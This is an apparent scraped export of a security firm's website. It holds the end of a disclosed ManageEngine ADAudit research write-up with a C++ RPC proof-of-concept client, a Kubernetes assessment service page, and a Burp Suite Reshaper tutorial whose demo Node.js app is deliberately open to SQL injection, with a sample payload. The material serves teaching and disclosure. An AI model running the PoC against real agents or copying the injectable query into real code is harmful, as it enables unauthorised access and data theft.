administrators.\nPOC:\nThe adauditrpc-client has be updated with input arguments and the latest version will be found at our github page https://github.com/shelltrail/adauditrpc-client\n/* file: adauditrpc-client.cpp */ #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;ctype.h\u0026gt; #include \u0026#34;ADAPAgentRpcPipe_h.h\u0026#34; #include \u0026lt;windows.h\u0026gt; #pragma comment(lib, \u0026#34;rpcrt4.lib\u0026#34;) #include \u0026lt;iostream\u0026gt; int wmain(int argc, wchar_t* argv[]) { if (argc \u0026lt; 5) { wprintf(L\u0026#34;Usage: %ls \u0026lt;IP\u0026gt; \u0026lt;AgentGUID\u0026gt; \u0026lt;case\u0026gt; \u0026lt;inputdata\u0026gt;\\n\u0026#34;, argv[0]); wprintf(L\u0026#34;Example - Enable SessionMonitoring: %ls 127.0.0.1 \\\u0026#34;1699964702085\\\u0026#34; 0 \\\u0026#39;\\\u0026#34;\\\u0026#34;\\\u0026#34;SMData\\\u0026#34;\\\u0026#34;\\\u0026#34;:{\\\u0026#34;\\\u0026#34;\\\u0026#34;SMStatus\\\u0026#34;\\\u0026#34;\\\u0026#34;:\\\u0026#34;\\\u0026#34;\\\u0026#34;True\\\u0026#34;\\\u0026#34;\\\u0026#34;}\\\u0026#39;\\n\u0026#34;, argv[0]); wprintf(L\u0026#34;Example - Enable Debug: %ls 127.0.0.1 \\\u0026#34;1699964702085\\\u0026#34; 8 \\\u0026#39;\\\u0026#34;\\\u0026#34;\\\u0026#34;ENABLE_DEBUG\\\u0026#34;\\\u0026#34;\\\u0026#34;:true\\\u0026#39;\\n\u0026#34;, argv[0]); return 1; } const wchar_t* ip = argv[1]; RPC_WSTR NetworkAddress = (RPC_WSTR)ip; printf(\u0026#34;[+] Accessing ADAPAgentRpcPipe named pipe on: %ls\\n\u0026#34;, ip); const wchar_t* agentuid = argv[2]; printf(\u0026#34;[+] Using AgentUID: %ls\\n\u0026#34;, agentuid); long arg_0 = std::wcstol(argv[3], nullptr, 10); printf(\u0026#34;[+] Case: %i\\n\u0026#34;, arg_0); const wchar_t* inputdata = argv[4]; wchar_t str1[256] = L\u0026#34;{\\\u0026#34;AgentUID\\\u0026#34;:\\\u0026#34;\u0026#34;; // Make sure the array is large enough wcscat_s(str1, agentuid); // Concatenates str1 and agentuid wcscat_s(str1, L\u0026#34;\\\u0026#34;,\u0026#34;); // Concatenates str1 and , wcscat_s(str1, inputdata); // Concatenates str1 and inputdata wcscat_s(str1, L\u0026#34;}\u0026#34;); // Concatenates str1 with }\u0026#34; wprintf(L\u0026#34;[+] InputData: %ls\\n\u0026#34;, str1); RPC_STATUS status; RPC_WSTR pszUuid = NULL; RPC_WSTR pszProtocolSequence = (RPC_WSTR)L\u0026#34;ncacn_np\u0026#34;; //RPC_WSTR pszNetworkAddress = (RPC_WSTR)L\u0026#34;100.64.5.212\u0026#34;; RPC_WSTR pszNetworkAddress = NetworkAddress; RPC_WSTR pszEndpoint = (RPC_WSTR)L\u0026#34;\\\\pipe\\\\ADAPAgentRpcPipe\u0026#34;; RPC_WSTR pszOptions = NULL; RPC_WSTR pszStringBinding = NULL; //unsigned char * pszString = \u0026#34;hello, world\u0026#34;; unsigned long ulCode; status = RpcStringBindingCompose(pszUuid, pszProtocolSequence, pszNetworkAddress, pszEndpoint, pszOptions, \u0026amp;pszStringBinding); if (status) exit(status); status = RpcBindingFromStringBinding(pszStringBinding, \u0026amp;DefaultIfName_v1_0_c_ifspec); if (status) exit(status); long arg2_pointer; long* arg_2 = \u0026amp;arg2_pointer; RpcTryExcept { Proc1(DefaultIfName_v1_0_c_ifspec, arg_0, str1, arg_2); } RpcExcept(1) { ulCode = RpcExceptionCode(); printf(\u0026#34;Runtime reported exception 0x%lx = %ld\\n\u0026#34;, ulCode, ulCode); } RpcEndExcept status = RpcStringFree(\u0026amp;pszStringBinding); if (status) exit(status); status = RpcBindingFree(\u0026amp;DefaultIfName_v1_0_c_ifspec); if (status) exit(status); exit(0); } /******************************************************/ /* MIDL allocate and free */ /******************************************************/ void __RPC_FAR* __RPC_USER midl_user_allocate(size_t len) { return(malloc(len)); } void __RPC_USER midl_user_free(void __RPC_FAR* ptr) { free(ptr); } Summary In this article we managed to reverse engineer the decryption process of an encrypted value stored in Windows registry. This decrypted value was an UUID used as a means of authentication when doing configuration changes via the ADAudit Agent.\nIt was a fun and educative process to bit by bit lay the puzzle to reach the objective and we at Shelltrail hope you enjoyed following along!\nThanks to ManageEngine (Zoho Corp) for handling the disclosure process.\nIn our three part series of security assessing ADAudit Plus we:\nPart 1 - Reverse engineered our way to build a RPC client Part 2 - Reverse engineered our way to craft valid input to the RPC server Part 3 - Reverse engineered our way to decrypt and AES encrypted cipher stored in Windows registry ","date":1716768000,"expirydate":-62135596800,"kind":"page","lang":"en","lastmod":1716768000,"objectID":"72de163fa1f0669ed18480c7d8cc79e4","permalink":"https://www.shelltrail.com/research/manageengine-adaudit-reverse-engineering-windows-rpc-to-find-cve-2024-36036-and-cve-2024-36037-part3/","publishdate":"2024-05-27T00:00:00Z","relpermalink":"/research/manageengine-adaudit-reverse-engineering-windows-rpc-to-find-cve-2024-36036-and-cve-2024-36037-part3/","section":"research","summary":"Part 3 of the ManageEngine ADAudit research focuses on how AES encrpytion was implemented in the ADAudit Agent, and how it was bypassed","tags":null,"title":"ManageEngine ADAudit - Reverse engineering Windows RPC to find CVEs - part 3/reverse engineering cryptography","type":"research"},{"authors":null,"categories":null,"content":"Kubernetes is a commonly used container orchestration tool providing scalability and resilience to enterprises utilizing containerized applications. Whether it may be internal policies or for compliance reasons, it is always beneficial to perform security assessments to proactively find vulnerabilities or misconfigurations. This may lower probability of a compromise occurring, and minimize the impact if it happens.\nWhat is assessed in a Kubernetes security review? When doing a Kubernetes security review the initial perspective can vary, it may be from the perspective of a compromised pod, a specific namespace or an employee with developer access. From here publicly known attack paths will be evaluated in an attempt to reach sensitive information or cluster-wide compromise.\nIn addition, CIS benchmarks will be used as a foundation for the assessment making sure that industry standard best-practices is evaluated in the environment. The Center for Internet Security (CIS) is a nonprofit organization that enhances cybersecurity readiness and response across public and private sectors. CIS provides extensive checklists in terms of best practices for security configurations.\nDeliverables after conducting a security review By the end of the assessment a de-briefing meeting with key stakeholders will be held to present the findings from the assessment, discuss recommendations and address questions or concerns. After the de-brief meeting the report will be delivered which includes an assessment description, a results \u0026amp; recommendations section and an executive summary. The executive summary is commonly used as a customer facing report showing proactive work in the IT security realm.\nContact If you wish to view a sample report or discuss/schedule an assessment, please use our contact form or reach out to us via email at info@shelltrail.com.\n","date":1714953600,"expirydate":-62135596800,"kind":"page","lang":"en","lastmod":1714953600,"objectID":"fb3bc1e58f4419b4008bc5aac413ff12","permalink":"https://www.shelltrail.com/cyber-security-services/kubernetes-security-assessment/","publishdate":"2024-05-06T00:00:00Z","relpermalink":"/cyber-security-services/kubernetes-security-assessment/","section":"cyber-security-services","summary":"Kubernetes security assessments aims to evaluate the current state of an organization's Kuberentes environment, identifying areas where improvements can be made to enhance overall security posture and proactively find vulnerabilities that may compromise the system’s integrity, availability or confidentiality.","tags":["Kubernetes security assessment","microservices","k8s","container orchestration","container security"],"title":"Kubernetes security assessment","type":"cyber-security-services"},{"authors":null,"categories":null,"content":" TL;DR This research will guide you through how to handle complex flows using the Reshaper plugin when performing web application security testing with Burp Suite. Even though Burp Suite arguably is the best proxy in the business - it falls short in certain tasks where the Reshaper plugin (developed by ddwightx) will shine.\nThis research may be used as a reference or baseline when building your Reshaper rules or a training ground to improve your Burp skills.\nIn total 7 scenarios will be displayed where all of them have an accompanied demo application:\nScenario 1 - Resending CSRF tokens which changes on each request with Burp Scenario 2 - Using Burp to increment values with Reshapers Evaluate action Scenario 3 - Using Burp with custom scripting via Reshapers JavaScript engine Scenario 4 - URL and base64 encoding Scenario 5 - Using Burp with command line tools with Reshapers Run Process Scenario 6 - Using Burp and Reshaper to perform multiple request and save PDF files to disk Scenario 7 - gRPC from the abyss While some of these scenarios can be solved with other solutions such as Mitmproxy, Hackvertor or Burp macros, this plugin gives more versatility.\nAnd a big shout out to @ddwightx for making all of these stunts available via Reshaper. Big thanks!\nUpdate 2025-08-26 Since the release of Reshaper v2.4.0 built-in functions such encoding and decoding base64 have been implemented. It is no longer necessary to create your own base64 encoder/decoder in JavaScript as seen in Scenario 4.\nBackground How many times have you had issues with handling CSRF tokens in a web assessment? What if you were told that this have been possible all along with the lesser known plugin called Reshaper?\nIt is powerful, extremely powerful. The popularity of this plugin is oddly enough low, maybe because of its complexity and limited guides and detailed setup steps.\nWe will show you how to utilize this plugin in some common scenarios where the standard Burp Suite lacks the capability.\nReshaper introduction When installed Reshaper provides a new tab in burp with multiple sub tabs:\nMost time will be spent in the HTTP rules sub tab as it is here you configure what actions the plugin should perform.\nLet\u0026rsquo;s start with a simple task such as setting a comment named testing on HTTP requests.\nUse the add button to create a new rule. In the Whens frame give it a name and choose the event direction of the rule. As we want to trigger on outgoing traffic we choose request as direction.\nThe next step is the provide what the action,Thens, will be when matching the Whens:\nChoose comment and add. Specify a name, check enabled an finish off with save.\nWe are now done. All request passing through Burp will have the comment \u0026ldquo;testing\u0026rdquo;. Nice.\nNow we want to change the Whens to only perform actions when the request is sent to a specific path i.e /user. Any of the following matches text will be sufficient:\nSource Message Value Source Value Type Match Text Request URI Path Text /user Request URI Text /user Request Status Line Text GET /user HTTP/1.1 URL Text http://localhost:3000/user The following setup will successfully comment a request with a status line of GET /user HTTP/1.1\nMore advanced rules can be performed such as matching if a JSON key value pair exists in the request body (be mindful that the Source Value Path and Match Text should not include quotation):\nThe following picture is an example request that will be matched by our rule:\nCool. Now we have a basic knowledge how to configure Reshaper. Lets dive in to some interesting scenarios.\nScenario 1 - Resending CSRF tokens which changes on each request with Burp Alright, we know the basics of how to configure Reshaper. Let\u0026rsquo;s put it to the test on a demo application.\nThe demo application is an API application hosted with node.js. Save this code as app.js and run it with node app.js:\n// mkdir $HOME/node-api-csrf // cd $HOME/node-api-csrf // npn init -y // npm install express uuid const express = require(\u0026#39;express\u0026#39;); const { v4: uuidv4 } = require(\u0026#39;uuid\u0026#39;); const app = express(); app.use(express.json()); // Middleware to parse JSON bodies // In-memory \u0026#34;database\u0026#34; const users = []; // CSRF tokens store const csrfTokens = new Map(); // Middleware to check CSRF token function checkCsrfToken(req, res, next) { const csrfToken = req.headers[\u0026#39;csrf-token\u0026#39;]; if (!csrfToken || !csrfTokens.has(csrfToken)) { const newToken = uuidv4(); csrfTokens.set(newToken, true); res.setHeader(\u0026#39;CSRF-Token\u0026#39;, newToken); // Provide a valid CSRF token in response header return res.status(403).json({ error: \u0026#34;Invalid CSRF token\u0026#34; }); } // CSRF token is valid, let\u0026#39;s remove it and proceed csrfTokens.delete(csrfToken); next(); } // Route to add a user app.post(\u0026#39;/user\u0026#39;, checkCsrfToken, (req, res) =\u0026gt; { const { name } = req.body; if (!name) { return res.status(400).json({ error: \u0026#39;Name is required\u0026#39; }); } users.push(name); // Storing the name in \u0026#34;database\u0026#34; const newToken = uuidv4(); csrfTokens.set(newToken, true); res.setHeader(\u0026#39;CSRF-Token\u0026#39;, newToken); // Provide a valid CSRF token in response header res.status(201).send(\u0026#39;User added\u0026#39;); }); // Starting the server const PORT = process.env.PORT || 3000; app.listen(PORT, () =\u0026gt; { console.log(`Server running on http://localhost:${PORT}`); }); The end-user can send a JSON formatted POST body to /user endpoint which adds a name to the in-memory database. The request will only be successful if the end-user provides CSRF token which is randomly generated and returned to the user as a HTTP response header.\nIf we would want to use Burp\u0026rsquo;s built in active scanner to look for vulnerabilities this would be a problem as we need to provide the CSRF token upon each request.\nTo circumvent this problem we create a new Reshaper rule called \u0026ldquo;set_csrf_variable\u0026rdquo; and configure the Whens with Request Direction = Response and actions as the example shown in the following table:\nRequest Direction Whens Source Message Value Source Identifier Identifier Placement Source Value Type Match Type Match Text Response Matches Text Response Header CSRF-Token Last Text Regex .+ The Regexp .+ matches any sequence of characters that is at least one character long which makes sure the Response Header CSRF-Token is not empty.\nFor the Thens part we want to store our CSRF-Token in a variable:\nRequest Direction Thens Source Message Value Source Identifier Identifier Placement Source Value Type Destination Variable Source Destination Variable Name Destination Variable Name N/A Set Variable Response Header CSRF-Token Last Text Global csrf_variable Text This rule will, for every response that has CSRF-Token set as a header, fetch the token value and save it to a variable named csrf_variable.\nThe result should look like this:\nNow, when sending a request to the server via Burp, a variable will be created or updated in the Global Variables sub tab of Reshaper:\nNext step is to use this csrf_variable in subsequent request. We do by creating a new rule called set_csrf with event direction request and by using the Set Value as a Whens action according to the following tables:\nRequest Direction Whens Source Message Value Source Value Type Match Type Match Text Request Matches Text URL Text Equals http://localhost:3000/user Request Direction Thens Source Text Source Type Value Destination Message Value Destination Identifier Destination Identifier Placement Destination Type Value N/A Set Value {{g:csrf_variable}} Text Request Header CSRF-Token Only Text The result should look like this:\nIf all steps are followed correctly every response that contains a CSRF-Token will will be saved as a variable which will be referenced and used in all upcoming request to http://localhost:3000/user. This makes it possible to, for instance, use Burp active scanner where CSRF tokens need to be provided.\nQuite powerful innit.\nBut now you went all this way only find out that your CSRF token is provided via cookies and not HTTP headers? Not a problem. Replace the references to Request Header and Response Header to Request Cookie and Response Cookie.\nScenario 2 - Using Burp to increment values with Reshapers Evaluate action In the previous scenario we configured Reshaper to fetch a value from a response and the use that value in subsequent requests which works perfectly when assessing applications with CSRF tokens.\nNow we will demonstrate another hurdle that Reshaper can help bypass, namely incrementing values.\nFor this demonstration we will yet again use an API hosted by node.js that takes user input in JSON format and stores in memory.\n// mkdir $HOME/node-api-version // cd $HOME/node-api-version // npn init -y // npm install express const express = require(\u0026#39;express\u0026#39;); const app = express(); const PORT = process.env.PORT || 3000; app.use(express.json()); // In-memory storage let userData = { name: null, version: 0 }; app.post(\u0026#39;/user\u0026#39;, (req, res) =\u0026gt; { const { name, version } = req.body; if (name \u0026amp;\u0026amp; version !== undefined) { if (version \u0026gt; userData.version) { userData.name = name; userData.version = version; return res.status(200).json({ message: \u0026#34;User data updated\u0026#34;, data: userData }); } else { return res.status(400).json({ error: \u0026#34;A newer version exists. Please update the version number.\u0026#34; }); } } else { return res.status(400).json({ error: \u0026#34;Both name and version are required\u0026#34; }); } }); app.listen(PORT, () =\u0026gt; { console.log(`Server running on http://localhost:${PORT}`); }); The end-user can send a JSON formatted POST body to /user endpoint which updates the name key on the server with the provided value. The request is only successful if the end-user provides a valid version number, which is increased every time the name is updated.\nPOST /user HTTP/1.1 Host: localhost Content-Type: application/json Content-Length: 31 { \u0026#34;name\u0026#34;:\u0026#34;user1\u0026#34;, \u0026#34;version\u0026#34;:1 } This obstacle would be a problem for Burp\u0026rsquo;s active scanner or let alone be a time consuming task overcoming manually when using Burp\u0026rsquo;s repeater.\nWe circumvent this by creating a new Reshaper rule called set_version_variable and configure the Whens to either of the following examples in the table which shows how to match text or JSON key values:\nRequest Direction Whens Source Message Value Source Value Type Source Value Path Match Type Match Text Response Matching Text Response Body Text N/A Contains \u0026ldquo;version\u0026rdquo;: Response Matching Text Response Body JSON data.version Regex [0-9] The usage of quotation with version in the first example is because we are now looking for a string in the response body which is quoted.. The reason for using data.version in the second example is because the response from the server is nested JSON, as in: HTTP/1.1 200 OK X-Powered-By: Express Content-Type: application/json; charset=utf-8 { \u0026#34;message\u0026#34;:\u0026#34;User data updated\u0026#34;, \u0026#34;data\u0026#34;:{ \u0026#34;name\u0026#34;:\u0026#34;user\u0026#34;, \u0026#34;version\u0026#34;:14 } } For the Thens we configure it as follows:\nRequest Direction Thens Source Message Value Source Value Type Source Value Path Destination Variable Source Destination Variable Name Destination Value Type N/A Set Variable Response Body JSON data.version Global version_variable Text This should make sure that we have the current version number stored in a variable in Burp. However, this must be increased by 1 because every time the name parameter is updated we need to provide a new version number.\nWe accomplish this by using the Evaluate action in Reshaper:\nRequest Direction Whens X Operation Y Destination Variable Source Destination Variable Name N/A Evaluate {{g:version_variable}} Add 1 Global version_variable_incremented The result should look like this:\nAnd the Evaluate action:\nNow, when sending a request to the server with a correct version number, two variables should be created in the Global Variables sub tab of Reshaper:\nNext step is to replace the version key-value in subsequent requests with the version_variable_incremented. We can perform this by creating a new rule with event direction request and by using the Set Value action according to the following image:\nIf all steps are followed correctly every request that contains a JSON key-value pair with the name version, with data as a digit and is sent to http://localhost:3000/user will have it\u0026rsquo;s version key-value replaced with our variable version_variable_increased. Great success.\nScenario 3 - Using Burp with custom scripting via Reshapers JavaScript engine This incrementation done by the Evalute action done in the previous scenario can also be perform with JavaScript. This scenarion will display the richness and customizability by using Reshapers JavaScript engine.\nSo instead of using the Evaluate setup in the previous example we replace it with Run Script. \u0026ldquo;Script\u0026rdquo; refers to JavaScript whereas Run Process can run execute python, ruby or bash scripts stored on the file system.\nThe following setup will use Run Script instead of Evaluate in the set_version_variable rules:\nWhens:\nRequest Direction Whens Source Message Value Source Value Type Source Value Path Destination Variable Source Destination Variable Name Destination Value Type Request Match text Response Body JSON data.version Global version_variable Text Thens:\nRequest Direction Thens Source Message Value Source Value Type Source Value Path Destination Variable Source Destination Variable Name Destination Value Type N/A Set Variable Response Body JSON data.version Global version_variable Text Instead of the Evaluate action we add Run Script with the following JavaScript code:\nvar version = Reshaper.variables.getGlobalVariable(\u0026#34;version_variable\u0026#34;); let verint = parseInt(version, 10); verint += 1; Reshaper.event.runThen(\u0026#34;SetVariable\u0026#34;, { text: verint, useMessageValue: false, targetSource: \u0026#34;Global\u0026#34;, variableName: \u0026#34;version_variable_incremented\u0026#34; } ); When configured it should look like this:\nThe JavaScript fetches the version_variable data and converts it to an int which is incremented and stored in a variable named version_variable_incremented.\nBy knowing how to fetch and store variables with Reshapers JavaScript Engine opens up for unlimited flexibility.\nScenario 4 - URL and base64 encoding New scenario new possibilities. Hackvertor is an awesome extension when is comes to converting and encoding data. All of these action can also be done with Reshaper which will be demonstrated in this scenario.\nThe following node.js application code is vulnerable to SQL injection, the caveat however is that the input is required to be base64 encoded. Compared to previous scenarios this demonstration application use form-urlencoding instead of JSON input to mix things up a bit.\n// mkdir $HOME/node-api-sqli // cd $HOME/node-api-sqli // npm init -y // npm install express sqlite3 body-parser const express = require(\u0026#39;express\u0026#39;); const bodyParser = require(\u0026#39;body-parser\u0026#39;); const sqlite3 = require(\u0026#39;sqlite3\u0026#39;).verbose(); const app = express(); const port = 3000; app.use(bodyParser.urlencoded({ extended: false })); // Initialize the in-memory SQLite database const db = new sqlite3.Database(\u0026#39;:memory:\u0026#39;, (err) =\u0026gt; { if (err) { return console.error(err.message); } console.log(\u0026#39;Connected to the in-memory SQLite database.\u0026#39;); }); // Create a users table and insert some sample data db.serialize(() =\u0026gt; { db.run(\u0026#39;CREATE TABLE users (id INTEGER PRIMARY KEY AUTOINCREMENT, name TEXT NOT NULL)\u0026#39;); db.run(\u0026#34;INSERT INTO users (name) VALUES (\u0026#39;Alice\u0026#39;), (\u0026#39;Bob\u0026#39;), (\u0026#39;Charlie\u0026#39;)\u0026#34;); }); // Middleware to decode base64 and URL encoding app.use((req, res, next) =\u0026gt; { if (req.method === \u0026#39;POST\u0026#39;) { if (typeof req.body.data === \u0026#39;string\u0026#39;) { try { let decodedData = decodeURIComponent(Buffer.from(req.body.data, \u0026#39;base64\u0026#39;).toString(\u0026#39;ascii\u0026#39;)); req.decodedInput = decodedData; next(); } catch (e) { res.status(400).send(\u0026#39;Invalid input. Please ensure your input is base64 and URL encoded.\u0026#39;); } } else { res.status(400).send(\u0026#39;Invalid input format.\u0026#39;); } } else { next(); } }); // Vulnerable SQL route app.post(\u0026#39;/search\u0026#39;, (req, res) =\u0026gt; { let query = `SELECT * FROM users WHERE name = \u0026#39;${req.decodedInput}\u0026#39;`; db.all(query, [], (err, rows) =\u0026gt; { if (err) { return res.status(500).send(\u0026#39;Error executing SQL query.\u0026#39;); } res.json(rows); }); }); app.listen(port, () =\u0026gt; { console.log(`Server running on http://localhost:${port}`); }); By supplying Alice' or '1'=1 base64 encoded in the data parameter the full database is dumped:\nThis SQL injection is very trivial to exploit and much more complex payloads may be needed in live environments. When testing and construction these payloads it may be time consuming to base64 decode or encode at every attempt.\nFor this we will use Reshaper to:\nFetch payload from the data parameter in our request body and store it in a variable named payload_plain_text Use the JavaScript engine to base64 encode our payload_plain_text data and store that as a new variable named payload_base64 Replace the data request body parameter with the payload stored in the payload_base64 variable Request Direction Whens Source Message Value Source Value Type Source Value Path Match Type Match Text Response Matching Text Request Body Params data Regexp .+ Request Direction Thens Source Message Value Source Value Type Source Value Path Destination Variable Source Destination Variable Name Destination Value Type N/A Set Variable Request Body Params data Global payload_plain_text Text Next we will add run a custom JavaScript that fetches the payload_plain_text, base64 encodes it and saves it to payload_base64\nRun Script:\nvar Base64 = { // private property _keyStr : \u0026#34;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=\u0026#34;, // public method for encoding encode : function (input) { var output = \u0026#34;\u0026#34;; var chr1, chr2, chr3, enc1, enc2, enc3, enc4; var i = 0; input = Base64._utf8_encode(input); while (i \u0026lt; input.length) { chr1 = input.charCodeAt(i++); chr2 = input.charCodeAt(i++); chr3 = input.charCodeAt(i++); enc1 = chr1 \u0026gt;\u0026gt; 2; enc2 = ((chr1 \u0026amp; 3) \u0026lt;\u0026lt; 4) | (chr2 \u0026gt;\u0026gt; 4); enc3 = ((chr2 \u0026amp; 15) \u0026lt;\u0026lt; 2) | (chr3 \u0026gt;\u0026gt; 6); enc4 = chr3 \u0026amp; 63; if (isNaN(chr2)) { enc3 = enc4 = 64; } else if (isNaN(chr3)) { enc4 = 64; } output = output + this._keyStr.charAt(enc1) + this._keyStr.charAt(enc2) + this._keyStr.charAt(enc3) + this._keyStr.charAt(enc4); } return output; }, // public method for decoding decode : function (input) { var output = \u0026#34;\u0026#34;; var chr1, chr2, chr3; var enc1, enc2, enc3, enc4; var i = 0; input = input.replace(/[^A-Za-z0-9\\+\\/\\=]/g, \u0026#34;\u0026#34;); while (i \u0026lt; input.length) { enc1 = this._keyStr.indexOf(input.charAt(i++)); enc2 = this._keyStr.indexOf(input.charAt(i++)); enc3 = this._keyStr.indexOf(input.charAt(i++)); enc4 = this._keyStr.indexOf(input.charAt(i++)); chr1 = (enc1 \u0026lt;\u0026lt; 2) | (enc2 \u0026gt;\u0026gt; 4); chr2 = ((enc2 \u0026amp; 15) \u0026lt;\u0026lt; 4) | (enc3 \u0026gt;\u0026gt; 2); chr3 = ((enc3 \u0026amp; 3) \u0026lt;\u0026lt; 6) | enc4; output = output + String.fromCharCode(chr1); if (enc3 != 64) { output = output + String.fromCharCode(chr2); } if (enc4 != 64) { output = output + String.fromCharCode(chr3); } } output = Base64._utf8_decode(output); return output; }, // private method for UTF-8 encoding _utf8_encode : function (string) { string = string.replace(/\\r\\n/g,\u0026#34;\\n\u0026#34;); var utftext = \u0026#34;\u0026#34;; for (var n = 0; n \u0026lt; string.length; n++) { var c = string.charCodeAt(n); if (c \u0026lt; 128) { utftext += String.fromCharCode(c); } else if((c \u0026gt; 127) \u0026amp;\u0026amp; (c \u0026lt; 2048)) { utftext += String.fromCharCode((c \u0026gt;\u0026gt; 6) | 192); utftext += String.fromCharCode((c \u0026amp; 63) | 128); } else { utftext += String.fromCharCode((c \u0026gt;\u0026gt; 12) | 224); utftext += String.fromCharCode(((c \u0026gt;\u0026gt; 6) \u0026amp; 63) | 128); utftext += String.fromCharCode((c \u0026amp; 63) | 128); } } return utftext; }, // private method for UTF-8 decoding _utf8_decode : function (utftext) { var string = \u0026#34;\u0026#34;; var i = 0; var c = c1 = c2 = 0; while ( i \u0026lt; utftext.length ) { c = utftext.charCodeAt(i); if (c \u0026lt; 128) { string += String.fromCharCode(c); i++; } else if((c \u0026gt; 191) \u0026amp;\u0026amp; (c \u0026lt; 224)) { c2 = utftext.charCodeAt(i+1); string += String.fromCharCode(((c \u0026amp; 31) \u0026lt;\u0026lt; 6) | (c2 \u0026amp; 63)); i += 2; } else { c2 = utftext.charCodeAt(i+1); c3 = utftext.charCodeAt(i+2); string += String.fromCharCode(((c \u0026amp; 15) \u0026lt;\u0026lt; 12) | ((c2 \u0026amp; 63) \u0026lt;\u0026lt; 6) | (c3 \u0026amp; 63)); i += 3; } } return string; } } var snus = Base64.encode(Reshaper.variables.getGlobalVariable(\u0026#34;payload_plain_text\u0026#34;)); Reshaper.event.runThen(\u0026#34;SetVariable\u0026#34;, { text: snus, useMessageValue: false, targetSource: \u0026#34;Global\u0026#34;, variableName: \u0026#34;payload_base64\u0026#34; } ); And to finish up, we\u0026rsquo;ll use the Set Value action to replace the payload in the data parameter that will be sent to the server:\nRequest Direction Thens Source Text Source Type Value Destination Message Value Destination Value Type Destination Identifier Placement Destination Value Path N/A Set Value {{g:payload_base64}} Text Request Body Params N/A data The three steps should be inserted in the following order:\nNow we can write our payloads in plain text and let Reshaper convert our input:\nAwesome, we can now on the fly base64 encode data in form-url parameters. This is certainly useful.\nScenario 5 - Using Burp with command line tools with Reshaper Run Process Alright, so in the previous example we implemented a base64 encoder in JavaScript to handle encoding of input to perform a SQL injection attack.\nIn this scenario we will continue build upon our base64 encoder but this time we will use it with the Run Process action in Reshaper. This will help us send complex data structures from Burp into a custom command-line tool, which will be used in upcoming HTTP requests.\nFor this demonstration we will use a web application that only accepts input if the input data is provided with a valid signature. The signature is verified with the node-rsa package.\nWe will continue using form-urlencoding as our input to further familiarize ourself with the concept.\nSetup the environment and store as app.js:\n// mkdir $HOME/node-api-sign // cd $HOME/node-api-sign // npn init -y // npm install express body-parser node-rsa // openssl rsa -pubout -in private_key.pem -out public_key.pem const express = require(\u0026#39;express\u0026#39;); const bodyParser = require(\u0026#39;body-parser\u0026#39;); const fs = require(\u0026#39;fs\u0026#39;); const NodeRSA = require(\u0026#39;node-rsa\u0026#39;); const app = express(); const port = 3000; // Use bodyParser to parse application/x-www-form-urlencoded bodies app.use(bodyParser.urlencoded({ extended: true })); // Load the public key from file const publicKey = fs.readFileSync(\u0026#39;public_key.pem\u0026#39;, \u0026#39;utf8\u0026#39;); const key = new NodeRSA(); key.importKey(publicKey, \u0026#39;public\u0026#39;); app.post(\u0026#39;/user\u0026#39;, (req, res) =\u0026gt; { let { name, signature } = req.body; if (!name || !signature) { return res.status(400).send(\u0026#39;Missing name or signature.\u0026#39;); } // Correcting URL-decoded Base64 signature: replace spaces with plus signs signature = signature.replace(/\\s/g, \u0026#39;+\u0026#39;); // Verify the signature const isVerified = key.verify( name, Buffer.from(signature, \u0026#39;base64\u0026#39;), \u0026#39;utf8\u0026#39;, \u0026#39;base64\u0026#39; ); if (!isVerified) { return res.status(401).send(\u0026#39;Invalid signature.\u0026#39;); } res.send(`Name ${name} has been securely stored.`); }); app.listen(port, () =\u0026gt; { console.log(`Server running on http://localhost:${port}`); }); We will use the following python3 script (signer.py) to perform the signing of the input data that will be sent to the server. The script also includes a try statement that checks if the input to the script is base64 encoded or not. More on this later.\nfrom cryptography.hazmat.primitives import hashes from cryptography.hazmat.primitives.asymmetric import padding from cryptography.hazmat.primitives.serialization import load_pem_private_key import base64 import sys import os # pip3 install cryptography data = (sys.argv[1]).encode() try: # Attempt to decode the base64-encoded string data = base64.b64decode(data).decode(\u0026#39;utf-8\u0026#39;) data = data.encode() #print(\u0026#34;Input is base64\u0026#34;) except Exception as e: # If decoding fails, return the original string #print(\u0026#34;Input not base64\u0026#34;) pass # Load your private key dir_path = os.path.dirname(os.path.realpath(__file__)) key_path = os.path.join(dir_path, \u0026#39;private_key.pem\u0026#39;) with open(key_path, \u0026#34;rb\u0026#34;) as key_file: private_key = load_pem_private_key(key_file.read(), password=None) # Sign the data signature = private_key.sign( data, padding.PKCS1v15(), hashes.SHA256() ) # Encode the signature in base64 to simplify handling signature_base64 = base64.b64encode(signature).decode() print(signature_base64) $ python3 signer.py asdf bciDlo5cqYPWzVqPMp2L263c7wKh+21fauQBr2m1kV59S2J/hxu2lohZEiVmvwtIFxBYUkziMy0Hq33MCe3fSi7fj7CoWw5CWz95i5kxLQ01wAfsTKl5M207y9lpE6J0djYYGeidjhb6PsMm+BsoQFQ2mO09LJwMLPcEM8t2Geg7LEurlyzYBMJwtBQZB3eU4vTvWx/H0MDGdYi5jssF3GzRweXkEaopNHbrftaEEQye2uKQDdlm0+ublpmuVDsHVohosTBn74+j0LUZLCIgH/CHukh0dKL7c5YQKOdApYuwsxL16xYDfG5uOvPZdjF3yryfxjm2b2Ru1uOTsjG8bA== $ curl -X POST -d \u0026#39;name=asdf\u0026amp;signature=bciDlo5cqYPWzVqPMp2L263c7wKh+21fauQBr2m1kV59S2J/hxu2lohZEiVmvwtIFxBYUkziMy0Hq33MCe3fSi7fj7CoWw5CWz95i5kxLQ01wAfsTKl5M207y9lpE6J0djYYGeidjhb6PsMm+BsoQFQ2mO09LJwMLPcEM8t2Geg7LEurlyzYBMJwtBQZB3eU4vTvWx/H0MDGdYi5jssF3GzRweXkEaopNHbrftaEEQye2uKQDdlm0+ublpmuVDsHVohosTBn74+j0LUZLCIgH/CHukh0dKL7c5YQKOdApYuwsxL16xYDfG5uOvPZdjF3yryfxjm2b2Ru1uOTsjG8bA==\u0026#39; http://localhost:3000/user Awesome, our demo application works:\nLets say we want to use Burps intruder to fuzz to name parameter. We begin by creating a Reshaper rule for when it should trigger:\nRequest Direction Whens Source Message Value Source Value Type Source Value Path Match Type Match Text Request Matching Text Request Body Params name Regexp .+ We\u0026rsquo;ll store our input parameter name as a variable named name_input:\nRequest Direction Thens Source Message Value Source Value Type Source Value Path Destination Variable Source Destination Variable Name Destination Value Type N/A Set Variable Request Body Params data Global name_input Text Next we take our name_input variable and base64 encode it much like we did in scenario 4. We store the base64 value in a variable named name_input_base64:\nRun 